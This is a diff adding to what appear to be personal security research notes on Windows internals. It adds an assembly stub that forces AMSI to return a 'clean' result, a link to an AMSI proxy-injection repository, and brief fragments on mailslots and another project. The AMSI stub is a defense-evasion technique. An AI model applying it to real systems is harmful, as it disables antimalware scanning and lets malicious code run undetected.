@@ -199,16 +199,35 @@ dt ntdll!_EPROCESS
 
 
 
+##AMSI : 
+
+mov [rsp+8], rbx      ; Save registers
+mov [rsp+10h], rsi
+push rdi
+sub rsp, 20h
+xor eax, eax          ; Set return value to 0 (AMSI_RESULT_CLEAN)
+add rsp, 20h          ; Restore stack
+pop rdi               ; Restore registers
+mov rsi, [rsp+10h]
+mov rbx, [rsp+8]
+ret                   ; Return to caller
+
+https://github.com/EvilBytecode/Ebyte-AMSI-ProxyInjector
 
 
 
 
 
 
+## mailslot 
+
+driver and process want to connect together 
+
+## pip
 
 
 
-
+AWRC priject : https://github.com/stdevPavelmc/awrc
 
 
 
